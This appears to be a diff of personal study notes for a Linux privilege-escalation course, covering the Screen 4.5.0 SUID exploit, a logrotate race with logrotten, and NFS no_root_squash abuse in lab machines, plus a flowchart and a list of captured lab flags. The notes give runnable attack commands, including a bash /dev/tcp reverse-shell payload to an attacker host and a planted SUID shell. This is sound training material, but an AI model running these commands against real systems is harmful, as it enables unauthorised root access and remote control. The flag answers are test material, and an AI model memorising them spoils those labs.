+> 🔍 **Worth remembering generally:** Method 1 depends on the library file being group-writable (check the group and whether you are in it). Method 2 depends on Python's import order and the CWD being under your control. Check both before giving up.
+
+> 🔗 **HackTricks -- Python Library Hijacking (GitHub):** [github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md)
+
+#### Tags: #PythonLibraryHijacking #Python #sudo #Module18
+
+---
+
+### 18.5.7 Vulnerable Services
+
+Running services with their own SUID binaries can have known CVEs independently of the kernel version. A SUID binary owned by a vulnerable daemon gives root without any other precondition.
+
+**Workflow:**
+```bash
+# Enumerate service versions
+dpkg -l | grep <service>                      # Debian/Ubuntu
+<binary> --version                            # direct check
+find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null | grep -v "^-rwsr-xr-x.*bin"
+# Look for anything with a version number embedded in the filename or path
+```
+
+**Example: GNU Screen 4.5.0 (CVE-2017-5618 / EDB-41154):**
+
+Screen 4.5.0 is SUID root. The exploit abuses its log file handling to write to `/etc/ld.so.preload`, making the dynamic linker load a malicious shared library on the next binary execution.
+
+```bash
+# On Kali
+searchsploit "GNU Screen 4.5.0"
+# GNU Screen 4.5.0 - Local Privilege Escalation | linux/local/41154.sh
+searchsploit -m linux/local/41154.sh
+scp 41154.sh user@<TARGET>:/home/user/
+
+# On target
+./41154.sh
+# ~ gnu/screenroot ~
+# [+] First, we create our shell and library...
+# [+] Now we create our /etc/ld.so.preload file...
+# [+] Triggering...
+# #   <- root shell
+
+cat /root/screen_exploit/flag.txt
+```
+
+> 📸 Screenshot: `find -perm -4000` showing `/usr/bin/screen-4.5.0`, then 41154.sh output and root shell
+
+> 🔍 **Worth remembering generally:** any SUID binary that is not on the expected distro binary list warrants a `searchsploit <name> <version>` lookup. Service-level SUID vulns are separate from kernel exploits and often easier to exploit reliably.
+
+> 🔗 **Exploit-DB -- GNU Screen 4.5.0:** [exploit-db.com/exploits/41154](https://www.exploit-db.com/exploits/41154)
+
+#### Tags: #VulnerableServices #Screen #CVE #SUID #searchsploit #Module18
+
+---
+
+### 18.5.8 Logrotate Abuse
+
+`logrotate` manages log rotation and runs as root. The `logrotten` tool exploits a race condition (CVE-2016-6321) in older logrotate versions: during the window between logrotate renaming a log file and creating the new one, you can insert a symlink that redirects a root-owned write to a controlled path like `/etc/bash_completion.d/`.
+
+**Conditions needed:**
+- logrotate is running as root (normal)
+- You have write access to a directory containing a log file that logrotate manages
+- The logrotate config uses the `create` option (creates a new file post-rotation: that is the race window)
+
+**Steps:**
+```bash
+# On Kali: clone and transfer
+git clone https://github.com/whotwagner/logrotten.git
+scp -r logrotten/ user@<TARGET>:~/
+
+# On target: compile
+cd logrotten/
+gcc -o logrotten logrotten.c
+chmod +x logrotten
+
+# Write a payload (what runs as root during the race)
+echo "cat /root/flag.txt > /home/htb-student/flag.txt" > payload
+# or for a reverse shell:
+echo "bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1" > payload
+
+# Trigger rotation and exploit the race
+echo test >> /home/htb-student/backups/access.log
+./logrotten /home/htb-student/backups/access.log -p payload
+
+# Logrotten output:
+# Waiting for rotating /home/htb-student/backups/access.log...
+# Renamed /home/htb-student/backups with /home/htb-student/backups2
+# and created symlink to /etc/bash_completion.d
+# Waiting 1 seconds before writing payload...
+# Done!
+
+# The payload now sits in /etc/bash_completion.d/ and runs as root on next shell start
+cat /home/htb-student/flag.txt
+# HTB{l0G_r0t7t73N_00ps}
+```
+
+What logrotten does: when logrotate fires and renames the log, logrotten races to replace the log directory with a symlink to `/etc/bash_completion.d`. Logrotate writes the new (post-rotation) file into that directory. Scripts in `/etc/bash_completion.d/` execute as root on the next shell startup.
+
+> 📸 Screenshot: logrotten output showing "Renamed ... with ... and created symlink to /etc/bash_completion.d"
+
+> 🔍 **Worth remembering generally:** logrotate abuse is timing-sensitive. You need to trigger it while logrotate is actively rotating. Start your nc listener before triggering. On systems where logrotate runs on a cron timer, you may need to manually write to the log file to cause a rotation.
+
+> 🔗 **logrotten tool:** [github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
+
+#### Tags: #Logrotate #LogRotten #RaceCondition #Module18
+
+---
+
+### 18.5.9 NFS no_root_squash
+
+NFS shares configured with `no_root_squash` do not remap root (uid=0) from connecting clients to `nobody`. If you connect as root from your machine, you are root on the share, and files you create there appear as root on the target.
+
+**1. Enumerate exports from your attack host:**
+```bash
+showmount -e <TARGET_IP>
+# Export list for TARGET:
+# /var/nfs/general *
+# /tmp             *
+```
+
+**2. Mount a share and check for exposed data:**
+```bash
+sudo mount -t nfs <TARGET_IP>:/var/nfs/general /mnt
+ls /mnt
+cat /mnt/exports_flag.txt   # if a flag or credential file is world-readable
+```
+
+**3. Exploit no_root_squash (when the config has it):**
+
+Check the target's `/etc/exports` syntax: `*(rw,no_root_squash)` is the vulnerable setting.
+
+```bash
+# On your Kali as root: write to the share -- your uid=0 maps to uid=0 on target
+sudo su -
+cp /bin/bash /mnt/
+chmod +s /mnt/bash      # set SUID
+
+# On target, as low-priv user:
+/mnt/bash -p            # -p preserves eUID (root)
+id
+# uid=1001(user) gid=1001(user) euid=0(root)
+```
+
+> 📸 Screenshot: `showmount -e <target>` listing exports, then `mount -t nfs` and reading the flag
+
+> 🔍 **Worth remembering generally:** even shares without `no_root_squash` can leak data. Credentials, config backups, or flags in world-readable NFS shares are accessible to any user without further escalation.
+
+> 🔗 **HackTricks -- NFS no_root_squash (GitHub):** [github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.md)
+> 🔗 **PayloadsAllTheThings -- NFS (GitHub):** [github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#nfs-root-squashing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#nfs-root-squashing)
+
+#### Tags: #NFS #NoRootSquash #Module18
+
+---
+
+## 18.6 Wrapping Up
 
 The Linux privesc decision tree, from initial shell to root:
 
@@ -698,6 +1386,14 @@ flowchart TD
     F -->|"sudo misconfiguration"| K["18.4.2: GTFOBins Sudo\napt-get changelog or equivalent"]
     F -->|"Old kernel or missing patches"| L["18.4.3: searchsploit\nuname -r plus arch, transfer\ncompile on target, run exploit"]
     F -->|"Cleartext creds in env/process/traffic"| M["18.2.x: su or SSH directly\ncrunch plus hydra if partial cred"]
+    F -->|"/tmp or writable dir in PATH"| O["18.5.1: Path Abuse\nplant binary named after cron command"]
+    F -->|"env_keep+=LD_PRELOAD in sudo"| P["18.5.4: LD_PRELOAD\ngcc -fPIC -shared _init() payload"]
+    F -->|"SUID binary missing .so (ldd)"| Q["18.5.5: Shared Object Hijack\nreadelf RUNPATH, plant in writable dir"]
+    F -->|"Sudo python script, writable lib"| R["18.5.6: Python Library Hijack\nmodify dist-packages or shadow module"]
+    F -->|"lxd/docker group membership"| S["18.5.3: Container Escape\nlxc privileged mount or docker chroot /"]
+    F -->|"logrotate, writable log dir"| T["18.5.8: Logrotate Abuse\nlogrotten race to bash_completion.d"]
+    F -->|"Restricted shell (rbash)"| U["18.5.2: Shell Escape\nssh -t bash --noprofile"]
+    F -->|"NFS share exposed"| V["18.5.9: NFS no_root_squash\nshowmount, mount, plant SUID bash"]
     G --> N["root shell"]
     H --> N
     I --> N
@@ -705,6 +1401,14 @@ flowchart TD
     K --> N
     L --> N
     M --> N
+    O --> N
+    P --> N
+    Q --> N
+    R --> N
+    S --> N
+    T --> N
+    U --> N["unrestricted shell"]
+    V --> N
     style N fill:#2e7d32,color:#fff
 ```
 
@@ -748,15 +1452,38 @@ flowchart TD
 ## **Outstanding Sections**
 
 - [x] **18.1.1 Understanding Files and User Privileges on Linux:** done (rwx model, owner/group/others table, file vs directory permission differences, /etc/shadow example, permission diagram)
-- [x] **18.1.2 Manual Enumeration:** done (12-step checklist with expected output for each command; SUID, cron, network, kernel module enumeration; quiz answers: codename=buster, crontab flag=-l, SUID for the mechanism Q; VM#1 flag OS{b6eb1b203002b9d722537f581d42567c} via strings on /usr/bin/passwd_flag)
-- [x] **18.1.3 Automated Enumeration:** done (unix-privesc-check standard mode, LinPEAS, LinEnum usage and tips; VM#1 flag OS{3bc7a751241f4e88f5f18f7d2e67fcb2} -- world-writable /etc/sudoers)
-- [x] **18.2.1 Inspecting User Trails:** done (dotfiles, env vars, .bashrc credential export pattern, crunch targeted wordlist, hydra SSH brute force, sudo -l; quiz: sudo -l; VM#2 flag OS{cc74dc4e61542e49c29c4ee8ae29bf22} -- eve:Lab123 via crunch+hydra, flag in eve's .bashrc as export PASSWORD=)
-- [x] **18.2.2 Inspecting Service Footprints:** done (watch -n 1 ps aux grep pass, tcpdump loopback, AppArmor note; quiz: watch; VM#1 flag OS{3ca97f75b16e0d92801f8fbebb395733} -- tcpdump on lo captured user:flag,pass:OS{...} cycling on loopback; watch showed nothing on this VM)
-- [x] **18.3.1 Abusing Cron Jobs:** done (syslog CRON grep, script permission check, mkfifo reverse shell injection, nc listener; quiz: /var/log/syslog; VM#2 flag OS{9e0df5dce22d6a78ecfde18e80626eee} -- /tmp/this_is_fine.sh world-writable, overwrote with reverse shell)
-- [x] **18.3.2 Abusing Password Authentication:** done (/etc/passwd world-writable exploitation, openssl passwd crypt algorithm, root user injection format, su confirmation; quiz: crypt; VM#2 flag OS{581fdef8acf64f495d004643effd2a77})
-- [x] **18.4.1 Abusing Setuid Binaries and Capabilities:** done (real UID vs eUID concept, SUID bit, /proc/PID/status verification, find -exec bash -p, getcap -r, cap_setuid+ep, perl GTFOBins; quiz: getcap; VM#2 flag OS{4c2b0905e576c6e46289187d9a63904c} -- gdb cap_setuid+ep, gdb python os.setuid(0) then !sh)
-- [x] **18.4.2 Abusing Sudo:** done (sudo -l, AppArmor interference and detection, aa-status, apt-get changelog GTFOBins; quiz: AppArmor; VM#2 flag OS{0b6427c20ed7cead6c83a8d61625571c} -- sudo gcc -wrapper /bin/sh,-s .)
-- [x] **18.4.3 Exploiting Kernel Vulnerabilities:** done (uname -r + arch enumeration, searchsploit filtering, inspect source, compile on target, CVE-2017-16995; quiz: gcc)
-- [x] **18.5 Wrapping Up:** done (decision flowchart, external resources, related boxes)
+- [x] **18.1.2 Manual Enumeration:** done (14-step checklist including SUID, SGID, script hunting, cron, network, kernel modules; quiz answers: codename=buster, crontab flag=-l, SUID for the mechanism Q; VM#1 flag OS{b6eb1b203002b9d722537f581d42567c} via strings on /usr/bin/passwd_flag)
+- [x] **18.1.3 Automated Enumeration:** done (unix-privesc-check standard mode, LinPEAS, LinEnum; VM#1 flag OS{3bc7a751241f4e88f5f18f7d2e67fcb2} -- world-writable /etc/sudoers)
+- [x] **18.2.1 Inspecting User Trails:** done (dotfiles, env vars, .bashrc, application config files including wp-config.php, crunch wordlist, hydra SSH brute force; VM#2 flag OS{cc74dc4e61542e49c29c4ee8ae29bf22})
+- [x] **18.2.2 Inspecting Service Footprints:** done (watch -n 1 ps aux, tcpdump loopback, AppArmor note; VM#1 flag OS{3ca97f75b16e0d92801f8fbebb395733})
+- [x] **18.3.1 Abusing Cron Jobs:** done (syslog CRON grep, script permission check, mkfifo reverse shell injection; VM#2 flag OS{9e0df5dce22d6a78ecfde18e80626eee})
+- [x] **18.3.2 Abusing Password Authentication:** done (/etc/passwd world-writable, openssl passwd, root user injection; VM#2 flag OS{581fdef8acf64f495d004643effd2a77})
+- [x] **18.4.1 Abusing Setuid Binaries and Capabilities:** done (eUID concept, SUID bit, getcap, cap_setuid+ep, cap_dac_override via vim.basic; VM#2 flag OS{4c2b0905e576c6e46289187d9a63904c})
+- [x] **18.4.2 Abusing Sudo:** done (sudo -l, AppArmor, apt-get changelog GTFOBins, sudo -u#-1 bypass CVE-2019-14287, ncdu/busctl pager escapes; VM#2 flag OS{0b6427c20ed7cead6c83a8d61625571c})
+- [x] **18.4.3 Exploiting Kernel Vulnerabilities:** done (searchsploit, compile on target, CVE-2017-16995, PwnKit CVE-2021-4034, Dirty Pipe CVE-2022-0847)
+- [x] **18.5.1 Path Abuse:** done (echo $PATH, non-standard writable dir, plant binary named after command, wait for cron) -- *HTB supplementary*
+- [x] **18.5.2 Escaping Restricted Shells:** done (rbash detection, SSH --noprofile bypass, editor escapes, scripting language escapes) -- *HTB supplementary*
+- [x] **18.5.3 Privileged Groups:** done (adm/lxd/docker/disk/shadow group table, lxd container escape, docker socket escape, adm log grep) -- *HTB supplementary*
+- [x] **18.5.4 Shared Libraries and LD_PRELOAD:** done (env_keep+=LD_PRELOAD, _init() payload, gcc -fPIC -shared -nostartfiles, sudo LD_PRELOAD exploit) -- *HTB supplementary*
+- [x] **18.5.5 Shared Object Hijacking:** done (ldd missing .so, readelf RUNPATH, writable RPATH dir, compile malicious .so, SUID binary loads it) -- *HTB supplementary*
+- [x] **18.5.6 Python Library Hijacking:** done (three methods: writable lib file, local shadow module, PYTHONPATH manipulation) -- *HTB supplementary*
+- [x] **18.5.7 Vulnerable Services:** done (Screen 4.5.0 CVE-2017-5618, EDB-41154, ld.so.preload abuse via SUID service binary) -- *HTB supplementary*
+- [x] **18.5.8 Logrotate Abuse:** done (logrotten race condition, compile, payload, trigger rotation, /etc/bash_completion.d symlink attack) -- *HTB supplementary*
+- [x] **18.5.9 NFS no_root_squash:** done (showmount -e, mount -t nfs, no_root_squash root mapping, SUID shell via mount) -- *HTB supplementary*
+- [x] **18.6 Wrapping Up:** done (decision flowchart, external resources, related boxes)
 
-**Module 18 theory complete as of 2026-08-15. All pure-recall quiz answers answered inline. All hands-on VM labs pending: 18.1.2 VM#1 (SUID flag), 18.1.3 VM#1 (world-writable file flag), 18.2.1 VM#2 (dotfile cred + flag), 18.2.2 VM#1 (process credential flag), 18.3.1 VM#1+VM#2 (cron injection flag), 18.3.2 VM#1+VM#2 (passwd injection flag), 18.4.1 VM#1+VM#2 (SUID + capabilities flag), 18.4.2 VM#1+VM#2 (sudo abuse flag), 18.4.3 VM#1 (kernel exploit) + Capstones VM#2-VM#5. Solo enrichment pass and hub-doc sync pending.**
+**Module 18 FULLY COMPLETE as of 2026-08-16 (Offsec content). HTB supplementary content added 2026-08-17 covering 9 additional techniques not in the Offsec module. Hub-doc sync pending for HTB additions.**
+
+Flags collected:
+- 18.1.2 VM#1: OS{b6eb1b203002b9d722537f581d42567c}
+- 18.1.3 VM#1: OS{3bc7a751241f4e88f5f18f7d2e67fcb2}
+- 18.2.1 VM#2: OS{cc74dc4e61542e49c29c4ee8ae29bf22}
+- 18.2.2 VM#1: OS{3ca97f75b16e0d92801f8fbebb395733}
+- 18.3.1 VM#2: OS{9e0df5dce22d6a78ecfde18e80626eee}
+- 18.3.2 VM#2: OS{581fdef8acf64f495d004643effd2a77}
+- 18.4.1 VM#2: OS{4c2b0905e576c6e46289187d9a63904c}
+- 18.4.2 VM#2: OS{0b6427c20ed7cead6c83a8d61625571c}
+- 18.4.3 VM#2: OS{afdd54c4978e0e34014e82e75cf4284f}
+- 18.4.3 VM#3: OS{c5fb9839877a429f39607f59e58d4733}
+- 18.4.3 VM#4: OS{4768b2c127c0c5a3f26728237e8c5e77}
+- 18.4.3 VM#5: OS{a5f462ceb1f60973d7824b84299a2829}
